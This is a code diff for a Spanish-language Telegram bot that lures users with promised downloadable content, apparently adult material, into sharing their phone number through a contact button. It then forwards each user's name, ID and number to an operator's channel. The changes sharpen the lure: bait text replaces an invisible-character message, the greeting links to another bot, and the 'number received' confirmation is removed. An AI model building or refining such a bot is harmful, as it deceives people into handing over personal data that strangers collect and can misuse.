@@ -39,7 +39,7 @@ def saludo(u) -> str:
     return (
         f"𝐇𝐨𝐥𝐚 {u.full_name} 𝐞𝐬𝐭𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐥𝐮𝐠𝐚𝐫 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨.\n"
         f"𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧:\n\n"
-        f"“𝐄𝐍𝐕𝐈𝐀𝐑 𝐀 𝐌𝐈 𝐂𝐇𝐀𝐓 𝐏𝐑𝐈𝐕𝐀𝐃𝐎”\n\n"
+        f"[𝐄𝐍𝐕𝐈𝐀𝐑 𝐀 𝐌𝐈 𝐂𝐇𝐀𝐓 𝐏𝐑𝐈𝐕𝐀𝐃𝐎](https://t.me/DescargarXXX_bot)\n\n"
         f"𝐩𝐚𝐫𝐚 𝐞𝐧𝐯𝐢𝐚𝐫𝐭𝐞 𝐞𝐥 𝐞𝐧𝐥𝐚𝐜𝐞 𝐝𝐞𝐥 𝐠𝐫𝐮𝐩𝐨."
     )
 
@@ -66,19 +66,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     chat = update.effective_chat
 
-    # VIDEO + mensaje de bienvenida
     if VIDEO:
         try:
-            await context.bot.send_video(chat_id=chat.id, video=VIDEO, caption=saludo(user))
+            await context.bot.send_video(chat_id=chat.id, video=VIDEO, caption=saludo(user), parse_mode="Markdown")
         except:
-            await context.bot.send_message(chat_id=chat.id, text=saludo(user))
+            await context.bot.send_message(chat_id=chat.id, text=saludo(user), parse_mode="Markdown")
     else:
-        await context.bot.send_message(chat_id=chat.id, text=saludo(user))
+        await context.bot.send_message(chat_id=chat.id, text=saludo(user), parse_mode="Markdown")
 
-    # Mostrar el botón nativo SIN texto visible (carácter invisible U+2063)
-    await context.bot.send_message(chat_id=chat.id, text="\u2063", reply_markup=kb_contacto())
+    # Mensaje para mostrar botón nativo
+    await context.bot.send_message(
+        chat_id=chat.id,
+        text="𝐏𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐭𝐨𝐝𝐨 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨 𝐚 𝐭𝐮 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨",
+        reply_markup=kb_contacto()
+    )
 
-    # Copiar inicio al canal
     header = (
         f"🆕 Usuario inició /start\n"
         f"• ID: {user.id}\n"
@@ -94,7 +96,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     contact = update.message.contact
 
-    await update.message.reply_text("✅ Número recibido.", reply_markup=ReplyKeyboardRemove())
+    # Ya NO enviamos "Número recibido", vamos directo a la botonera
     await update.message.reply_text(post_contacto(user), reply_markup=kb_unirme())
 
     m = await context.bot.send_message(CANAL, f"📱 {user.full_name} compartió su número: {contact.phone_number}")
@@ -116,7 +118,6 @@ async def relay_private(update: Update, context: ContextTypes.DEFAULT_TYPE):
     INDEX[copied.message_id] = update.effective_chat.id
 
 async def reply_from_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Solo nos interesa si es un post del canal y es reply a algo del bot
     if not update.channel_post or not update.channel_post.reply_to_message:
         return
     canal_msg = update.channel_post
@@ -124,7 +125,6 @@ async def reply_from_channel(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if key not in INDEX:
         return
     user_chat_id = INDEX[key]
-    # Reenviar al usuario exactamente lo que escribiste/mandaste en el canal
     await context.bot.copy_message(user_chat_id, CANAL, canal_msg.message_id)
 
 # ---------- Comandos BAN ----------
@@ -170,7 +170,6 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, on_contact))
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE, relay_private))
-    # Capturamos TODOS los posts y filtramos dentro para canal/reply
     app.add_handler(MessageHandler(filters.ALL, reply_from_channel))
 
     app.add_handler(CommandHandler("ban", ban))
